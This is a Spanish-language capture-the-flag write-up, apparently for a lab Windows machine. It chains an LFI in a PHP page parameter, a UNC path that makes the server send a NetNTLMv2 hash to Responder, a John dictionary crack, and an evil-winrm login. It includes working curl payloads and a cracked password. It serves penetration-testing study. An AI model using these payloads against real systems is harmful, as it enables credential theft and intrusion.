// 01

Vhost y LFI

1
IDENTIFICAR EL VHOST
CURL
$ curl -s -H 'Host: unika.htb' http://10.129.95.234/
index.php
french.html
german.html # selector de idioma: ?page=french / ?page=german
2
CONFIRMAR EL LFI
CURL
$ curl -s -H 'Host: unika.htb' 'http://10.129.95.234/index.php?page=../../../../windows/system32/drivers/etc/hosts'
# Copyright (c) 1993-2009 Microsoft Corp.
127.0.0.1 localhost

// LOCAL FILE INCLUSION

Dónde: parámetro page de index.php, usado directamente en un include de PHP.
Qué permite: leer archivos del sistema con path traversal — y, como se ve en el siguiente paso, include en PHP también acepta rutas UNC de Windows.

// 02

Captura con Responder

3
FORZAR LA AUTENTICACIÓN SMB DEL SERVIDOR

Si el include acepta una ruta \\host\share, el propio proceso de PHP en Windows intentará autenticarse por SMB contra esa ruta para leer el archivo — justo lo que Responder está esperando capturar.

RESPONDER
$ sudo responder -I tun0 -wv
$ curl -s -H 'Host: unika.htb' 'http://10.129.95.234/index.php?page=\\10.10.16.12\share\test'
[SMB] NTLMv2-SSP Client : 10.129.95.234
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash : Administrator::RESPONDER:...
BASH
$ sudo cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.95.234.txt

// NOTA

El hash capturado es del usuario que ejecuta el servicio web — en esta máquina, directamente Administrator. No hace falta tocar nada más en el servidor: la propia petición HTTP desencadena la autenticación SMB saliente.

// 03

Crackeo y WinRM

4
ROMPER EL HASH NETNTLMV2
JOHN
$ john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/rs_hash.txt
$ john --show /tmp/rs_hash.txt
Administrator:badminton
5
ENTRAR POR WINRM Y LEER LA FLAG
EVIL-WINRM
$ printf 'whoami\ntype C:\\Users\\mike\\Desktop\\flag.txt\n' | evil-winrm -i 10.129.95.234 -u Administrator -p 'badminton'
responder\administrator
[flag oculta]

// OJO

evil-winrm -c "..." conecta pero no siempre ejecuta el comando pasado así; enviar las órdenes por stdin (como arriba) es más fiable para un uso no interactivo.

// FLAG

[flag oculta] — en C:\Users\mike\Desktop\flag.txt, leída ya como Administrator. Ruta completa: LFI (page) → ruta UNC → Responder captura NetNTLMv2 → John → evil-winrm. Tiempo total: ~25 minutos.

// 04

Referencia Comandos

responder
sudo responder -I <interfaz> -wv
Levanta servidores falsos (SMB, HTTP, LLMNR/NBT-NS...) para capturar hashes de autenticación de otros hosts.
  • -I → Interfaz de red donde escuchar (la de la VPN del laboratorio).
  • -wv → Modo WPAD + verboso.
john (NetNTLMv2)
john --wordlist=lista hash.txt ; john --show hash.txt
Rompe por diccionario un hash NetNTLMv2 capturado y muestra la contraseña recuperada.
evil-winrm
evil-winrm -i IP -u usuario -p contraseña
Cliente de WinRM (PowerShell remoto) en Ruby, la forma habitual de obtener shell en Windows con credenciales válidas.

// 05

Glosario

LFI → ruta UNC
Caso particular de LFI donde el include de PHP en Windows acepta una ruta de red (\\host\recurso), provocando que el propio servidor se autentique por SMB contra un host externo controlado por el atacante.
NetNTLMv2
Protocolo de autenticación de Windows basado en un reto-respuesta. El hash capturado no es la contraseña directamente, pero se puede romper por diccionario o fuerza bruta offline.
Responder
Herramienta que envenena protocolos de resolución de nombres (LLMNR, NBT-NS) y levanta servicios falsos (SMB, HTTP...) para capturar credenciales de autenticación en la red.
WinRM / evil-winrm
WinRM es el servicio de gestión remota de Windows (puerto 5985/5986). evil-winrm es el cliente más usado en pentesting para obtener una shell con credenciales válidas.
